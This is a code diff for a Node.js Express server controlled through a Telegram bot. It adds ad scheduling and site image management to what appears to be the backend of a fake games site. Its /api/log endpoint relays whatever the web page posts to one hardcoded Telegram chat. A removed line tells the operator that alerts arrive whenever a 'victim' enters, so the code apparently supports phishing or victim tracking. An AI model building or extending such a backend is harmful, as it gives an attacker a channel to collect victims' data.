@@ -10,59 +10,126 @@ const myId = '8305841557';
 app.use(express.json());
 app.use(express.static(__dirname));
 
-let siteConfig = { ad: { image: "" } };
+// نظام تخزين الإعلانات والصور المتطور
+let adsDatabase = []; // مصفوفة لتخزين عدة إعلانات
+let siteImages = [];  // مصفوفة لتخزين صور الموقع وتعديلها
+let userState = {};   // لتتبع خطوات المدير عند الرفع
 
 // تشغيل الواجهة
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
+app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });
 
+// إرسال الإعلانات النشطة فقط بناءً على الوقت والتاريخ للموقع
 app.get('/api/config', (req, res) => {
-    res.json(siteConfig);
+    const now = new Date();
+    const currentTime = now.getHours() + ":" + now.getMinutes();
+    
+    // تصفية الإعلانات التي يجب أن تظهر الآن
+    let activeAds = adsDatabase.filter(ad => {
+        if (!ad.startTime || !ad.endTime) return true;
+        return currentTime >= ad.startTime && currentTime <= ad.endTime;
+    });
+
+    res.json({ ads: activeAds, images: siteImages });
 });
 
 app.post('/api/log', (req, res) => {
-    const { message } = req.body;
-    bot.sendMessage(myId, message);
+    bot.sendMessage(myId, req.body.message);
     res.sendStatus(200);
 });
 
-// لوحة التحكم عند إرسال /start
+// --- لوحة التحكم (الرئيسية) ---
 bot.onText(/\/start/, (msg) => {
+    if (msg.chat.id.toString() !== myId) return;
+    const opts = {
+        reply_markup: {
+            keyboard: [
+                ['➕ إضافة إعلان جديد', '🖼️ خيارات أكثر'],
+                ['📊 إحصائيات', '⚙️ إعدادات أخرى']
+            ],
+            resize_keyboard: true
+        }
+    };
+    bot.sendMessage(myId, "🛠️ لوحة تحكم نظام ألعاب الزمان المطور\nاختر من القائمة:", opts);
+});
+
+// --- معالجة الأزرار والقوائم ---
+bot.on('message', async (msg) => {
     const chatId = msg.chat.id.toString();
-    if (chatId === myId) {
+    if (chatId !== myId) return;
+    const text = msg.text;
+
+    if (text === '➕ إضافة إعلان جديد') {
+        userState[chatId] = { step: 'WAITING_FOR_AD_PHOTO' };
+        bot.sendMessage(chatId, "📸 من فضلك أرسل صورة الإعلان الآن:");
+    }
+
+    if (text === '⚙️ إعدادات أخرى') {
+        const opts = {
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: "🗑️ حذف جميع الإعلانات", callback_data: "clear_ads" }],
+                    [{ text: "⏱️ ضبط وقت الإعلانات", callback_data: "set_time" }]
+                ]
+            }
+        };
+        bot.sendMessage(chatId, "⚙️ خيارات الإعلانات المتقدمة:", opts);
+    }
+
+    if (text === '🖼️ خيارات أكثر') {
         const opts = {
             reply_markup: {
                 keyboard: [
-                    ['📊 إحصائيات الموقع', '🖼️ تغيير الإعلان'],
-                    ['⚙️ إعدادات أخرى', '🔄 إعادة تشغيل النظام']
+                    ['📤 إضافة/تعديل صورة الموقع', '🗑️ حذف صورة'],
+                    ['✏️ تعديل اسم صورة', '🔢 تحديد مرات الظهور'],
+                    ['🔙 العودة للرئيسية']
                 ],
                 resize_keyboard: true
             }
         };
-        bot.sendMessage(chatId, "🛠️ أهلاً بك في لوحة تحكم نظام ألعاب الزمان\n\nاختر من القائمة بالأسفل أو أرسل صورة مباشرة لتغيير الإعلان:", opts);
-    } else {
-        bot.sendMessage(chatId, "عذراً، هذا البوت مخصص لمدير النظام فقط.");
+        bot.sendMessage(chatId, "🖼️ قائمة التحكم في صور المحتوى:", opts);
+    }
+
+    if (text === '🔙 العودة للرئيسية') {
+        bot.sendMessage(chatId, "تم العودة للقائمة الرئيسية.", {
+            reply_markup: { keyboard: [['➕ إضافة إعلان جديد', '🖼️ خيارات أكثر'], ['📊 إحصائيات', '⚙️ إعدادات أخرى']], resize_keyboard: true }
+        });
+    }
+
+    // منطق استقبال الصور والبيانات
+    if (msg.photo && userState[chatId]) {
+        const fileId = msg.photo[msg.photo.length - 1].file_id;
+        const link = await bot.getFileLink(fileId);
+
+        if (userState[chatId].step === 'WAITING_FOR_AD_PHOTO') {
+            adsDatabase.push({ image: link, startTime: "00:00", endTime: "23:59", days: 7 });
+            bot.sendMessage(chatId, "✅ تم رفع الإعلان بنجاح بنظام الترتيب!");
+            delete userState[chatId];
+        } 
+        else if (userState[chatId].step === 'WAITING_FOR_SITE_IMG') {
+            userState[chatId].link = link;
+            userState[chatId].step = 'WAITING_FOR_IMG_NAME';
+            bot.sendMessage(chatId, "📝 أرسل الآن اسماً لهذه الصورة:");
+        }
+    } else if (userState[chatId] && userState[chatId].step === 'WAITING_FOR_IMG_NAME') {
+        const imgName = text;
+        const newImg = { name: imgName, url: userState[chatId].link, id: siteImages.length + 1, views: 100 };
+        siteImages.push(newImg);
+        bot.sendMessage(chatId, `✅ تم حفظ الصورة باسم: ${imgName}\nرقم الصورة في الموقع: ${newImg.id}`);
+        delete userState[chatId];
     }
 });
 
-// استقبال الصور لتحديث الإعلان
-bot.on('photo', async (msg) => {
-    const chatId = msg.chat.id.toString();
-    if (chatId === myId) {
-        const photo = msg.photo[msg.photo.length - 1];
-        const fileLink = await bot.getFileLink(photo.file_id);
-        siteConfig.ad.image = fileLink;
-        bot.sendMessage(chatId, "✅ تم تحديث صورة الإعلان في الموقع فوراً!");
+// معالجة الأزرار المخفية (Inline)
+bot.on('callback_query', (query) => {
+    const chatId = query.message.chat.id;
+    if (query.data === 'clear_ads') {
+        adsDatabase = [];
+        bot.sendMessage(chatId, "🗑️ تم حذف جميع الإعلانات من السيرفر.");
     }
-});
-
-// معالجة أزرار القائمة
-bot.on('message', (msg) => {
-    if (msg.text === '📊 إحصائيات الموقع') {
-        bot.sendMessage(myId, "📈 النظام يعمل بشكل مستقر وتصلك الإشعارات عند دخول أي ضحية.");
+    if (query.data === 'set_time') {
+        bot.sendMessage(chatId, "قم بإرسال الوقت بالتنسيق التالي لتعديل آخر إعلان:\nمثال: 08:00-22:00");
     }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => { console.log(`Server is running on port ${PORT}`); });
+app.listen(PORT, () => { console.log(`System running on port ${PORT}`); });
